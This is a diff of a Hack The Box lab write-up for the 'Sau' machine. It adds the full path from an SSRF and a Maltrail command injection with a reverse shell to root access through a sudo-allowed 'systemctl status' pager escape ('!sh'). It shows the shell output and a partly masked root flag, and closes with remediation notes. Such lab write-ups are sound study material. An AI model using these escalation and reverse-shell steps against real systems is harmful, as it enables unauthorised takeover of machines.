@@ -1,4 +1,4 @@
-# HTB - Sau: 
+# HTB - Sau (Complete): 
 # IP: 10.10.11.224, sau.htb
 
 # Methodology
@@ -13,6 +13,10 @@
 
 While the cycle is best repeated fully it is allowable to break back to step one at any time if issues arrise which prevent progress during the other steps.
 
+# Completed Path
+External access > Request-Buckets(SSRF) > Maltrail (RCE) > User access
+
+User access > Systemctl (Privilage Escalation) > Root access
 # Investigate
 
 ## NMAP
@@ -148,19 +152,13 @@ This time the vulnerability may lead to a more severe RCE (Remote Code Execution
 
 Having found myself inside a linux box again is good, although i currently only have initial access with a user account, there are many different priviliage escalation bugs which have existed in many different types of Linux environments. 
 
-### Privilage Escalation [Assessing]
+### Privilage Escalation [Confirmed]
 
-One of the first commands to run when looking for escalation bugs is determining if the users of this server have built a method in for us by accident by allowing the user to run select administrative tasks which may be abused.
+One of the first things i try to find once initial user access has been gained is escalation bugs to attempt to gain root access to this machine, if i do that, this machine is fully under my control and i could even lock access out from the true owners of the machine.
 
-```bash
-puma@sau:/dev/shm$ sudo -l
-sudo -l
-Matching Defaults entries for puma on sau:
-    env_reset, mail_badpass,
-    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+Sometimes, the users of this server have built a method in for us by accident by allowing the user to run select administrative tasks which may be abused. This is checked in the [Assessing](#assess) portion.
 
-User puma may run the following commands on sau:
-    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service``` 
+
 
 # Assess
 ## Requests-Baskets
@@ -225,6 +223,26 @@ Using a `;` character indicates to me that this is possibly a linux command inje
 The payload is encoded using base64 and piped using `|` (which also indicates linux injection) to decode and piped into `sh` to run a reverse shell to the attacker.
 
 Again, this code was re-written and added onto the previous exploit code, and can also be found in the [Exploit](#exploit) section.
+
+## Initial Access
+
+When checking for privilage escalation 
+```bash
+puma@sau:/dev/shm$ sudo -l
+sudo -l
+Matching Defaults entries for puma on sau:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User puma may run the following commands on sau:
+    (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
+```
+An easy way to check if a process can be abused if it is run under sudo is to check [GTFOBins](https://gtfobins.github.io/gtfobins/), it's an extremely useful tool when checking for privilage escalation and lists a large amount of built in programs. 
+
+Shown on the page is indeed a way to exploit systemctl, although there is not one for the specific `systemctl status` function there is one for use on the pager for systemctl (less) which indicates a method of running a command directly from the pager using the `!` exclamation point.
+
+This method is tested in the [Exploit](#exploit) section
+
 # Exploit
 
 ## Request-Baskets
@@ -288,6 +306,43 @@ I Setup a simple HTTP server and chose to wrap my injected commands into a curl 
 And when running the script with a `nc` (netcat) listener i see:
 ![Internal Access](https://github.com/e-war/Writeups/blob/master/HackTheBox/Sau/Images/2.png?raw=true)
 
+## Privilage Escalation
+Using the command provided by the `sudo -l` command leads into the `less` pager.
+
+```bash
+sudo /usr/bin/systemctl status trail.service
+     Loaded: loaded (/etc/systemd/system/trail.service; enabled; vendor preset:>
+     Active: active (running) since Sat 2023-08-12 06:25:55 UTC; 2h 26min ago
+       Docs: https://github.com/stamparm/maltrail#readme
+             https://github.com/stamparm/maltrail/wiki
+   Main PID: 878 (python3)
+      Tasks: 31 (limit: 4662)
+     Memory: 332.9M
+     CGroup: /system.slice/trail.service
+             ├─  878 /usr/bin/python3 server.py
+             ├─ 1038 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
+             ├─ 1039 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
+             ├─ 1042 sh
+             ├─ 1045 python3 -c import socket,os,pty;s=socket.socket(socket.AF_>
+             ├─ 1046 /bin/sh
+             ├─ 1165 script /dev/null -c bash
+             ├─ 1166 bash
+             ├─ 1182 sudo /usr/bin/systemctl status trail.service
+             ├─ 1183 /usr/bin/systemctl status trail.service
+             ├─ 1184 pager
+             ├─ 1185 sh -c /bin/bash -c sh
+             ├─ 1186 sh
+             ├─ 1357 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
+lines 1-23
+```
+Then typing `!sh`
+```bash
+             ├─ 1186 sh
+             ├─ 1357 /bin/sh -c logger -p auth.info -t "maltrail[878]" "Failed >
+lines 1-23!sh
+# 
+```
+The last # is the input and indicates we have `root` user.
 # Review
 ## Request-Baskets
 The public facing attack surface of Requests-Buckets allowed further exploitation of the system by granting access to "internal" services local to the vulnerable device due to the running version being out of date. 
@@ -302,3 +357,14 @@ Although this service is hidden behind an IP filter it is still accessable due t
 Again this service is out of date and PoC are easily found, therefore upgrading this version to the newest version will also close this vulnerability.
 
 Now internal access to the machine has been aquired, futher [Investigation](#investigate) is required to see if the machine is vulnerable to internal attacks.
+
+## Initial Access
+Once access is gained to the system, an attacker looks for privilage escalation if root access is not already provided. This is to ensure that the attacker has the highest level of privilage to continue on attacking potentially the internal network.
+
+There is not really a reason for the puma user to be able to run systemctl as sudo without a password, if there is a script which requires its use it should be modified to allow only privilaged and authenticated users to read from systemctl.
+
+Now root access has been gained, collecting the flag is as simple as
+ ```bash 
+ cat /root/root.txt
+ ec84067****************62c101
+ ```
